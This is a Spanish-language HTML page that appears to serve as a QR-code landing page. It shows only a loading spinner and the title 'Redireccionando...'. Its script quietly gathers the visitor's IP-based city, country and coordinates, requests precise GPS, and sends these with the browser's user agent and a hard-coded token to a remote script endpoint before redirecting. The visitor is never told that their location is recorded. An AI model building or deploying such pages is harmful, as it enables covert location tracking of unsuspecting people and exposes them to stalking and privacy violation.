<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Redireccionando...</title>

<style>
body {
  font-family: Arial, sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  background: #f4f4f9;
}
.loader {
  border: 4px solid #eee;
  border-top: 4px solid #2ecc71;
  border-radius: 50%;
  width: 40px;
  height: 40px;
  animation: spin 1s linear infinite;
}
@keyframes spin {
  100% { transform: rotate(360deg); }
}
</style>
</head>

<body>

<div class="loader"></div>

<script>
const CONFIG = {
  scriptURL: "PEGAR_URL_SCRIPT",
  token: "gonza_seguro_123"
};

const params = new URLSearchParams(window.location.search);
const objeto = params.get("objeto") || "QR_Default";
const ua = navigator.userAgent;

function finalizar(url = "https://google.com") {
  window.location.href = url;
}

// 🔥 API IP CONFIABLE
fetch("https://ipapi.co/json/")
  .then(r => r.json())
  .then(geo => {

    console.log("IP DATA:", geo);

    const base = {
      ip: geo.ip || "",
      ciudad: geo.city || "",
      pais: geo.country_name || "",
      lat: geo.latitude || "",
      lon: geo.longitude || ""
    };

    let enviado = false;

    const enviarSeguro = (data, metodo) => {
      if (enviado) return;
      enviado = true;

      console.log("ENVIANDO:", data, metodo);

      enviar(data, metodo);
    };

    // 🔁 INTENTO GPS
    if ("geolocation" in navigator) {

      const timeout = setTimeout(() => {
        console.warn("Timeout GPS → usando IP");
        enviarSeguro(base, "IP");
      }, 4000);

      navigator.geolocation.getCurrentPosition(
        pos => {
          clearTimeout(timeout);

          enviarSeguro({
            ...base,
            lat: pos.coords.latitude,
            lon: pos.coords.longitude
          }, "GPS");
        },
        err => {
          clearTimeout(timeout);

          console.warn("GPS rechazado → usando IP");

          enviarSeguro(base, "IP");
        },
        { timeout: 3500, enableHighAccuracy: true }
      );

    } else {
      console.warn("Sin geolocalización → usando IP");
      enviarSeguro(base, "IP");
    }

  })
  .catch(err => {
    console.error("Error obteniendo IP:", err);

    // fallback extremo
    enviar({
      lat: "",
      lon: "",
      ip: "",
      ciudad: "",
      pais: ""
    }, "SinDatos");
  });

function enviar(data, metodo) {

  const query = new URLSearchParams({
    token: CONFIG.token,
    objeto: objeto,
    lat: data.lat || "",
    lon: data.lon || "",
    ip: data.ip || "",
    ciudad: data.ciudad || "",
    pais: data.pais || "",
    metodo: metodo,
    ua: ua
  });

  fetch(`${CONFIG.scriptURL}?${query}`)
    .then(r => r.json())
    .then(res => {
      console.log("RESPUESTA:", res);
      finalizar(res.redirect);
    })
    .catch(err => {
      console.error("Error enviando:", err);
      finalizar();
    });
}
</script>

</body>
</html>
